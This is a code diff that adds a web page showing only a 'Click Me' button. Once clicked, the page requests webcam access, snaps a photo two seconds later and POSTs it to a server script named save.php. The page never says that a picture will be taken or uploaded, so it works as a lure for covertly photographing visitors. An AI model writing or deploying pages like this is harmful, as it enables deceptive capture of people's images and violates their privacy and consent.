@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Click Me</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f0f0f0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #cheese-btn {
+      font-size: 24px;
+      padding: 16px 32px;
+      background-color: #4caf50;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+      transition: background-color 0.2s;
+      margin-bottom: 16px;
+    }
+    #cheese-btn:hover {
+      background-color: #3e8e41;
+    }
+    #camera-container {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+    }
+    #camera {
+      width: 100%;
+      height: auto;
+      max-height: 100%;
+      object-fit: cover;
+    }
+    #photo-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
+      max-width: 100%;
+      margin: 0 -8px;
+    }
+    .photo {
+      width: calc(50% - 16px);
+      max-width: 200px;
+      margin: 8px;
+    }
+  </style>
+</head>
+<body>
+  <button id="cheese-btn">Click Me</button>
+  <div id="camera-container">
+    <video id="camera" autoplay></video>
+  </div>
+  <div id="photo-container"></div>
+  <script>
+    const cheeseBtn = document.getElementById('cheese-btn');
+    const cameraContainer = document.getElementById('camera-container');
+    const camera = document.getElementById('camera');
+    const photoContainer = document.getElementById('photo-container');
+
+    cheeseBtn.addEventListener('click', () => {
+      cameraContainer.style.display = 'flex';
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+          camera.srcObject = stream;
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+
+      setTimeout(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = camera.videoWidth;
+        canvas.height = camera.videoHeight;
+        canvas.getContext('2d').drawImage(camera, 0, 0, canvas.width, canvas.height);
+        const image = canvas.toDataURL('image/png');
+        console.log(image);
+
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', 'save.php');
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onload = function() {
+          console.log(xhr.responseText);
+        };
+        xhr.send('data=' + encodeURIComponent(image));
+
+        cameraContainer.style.display = 'none';
+        const photo = document.createElement('img');
+        photo.classList.add('photo');
+        photo.src = image;
+        photoContainer.appendChild(photo);
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
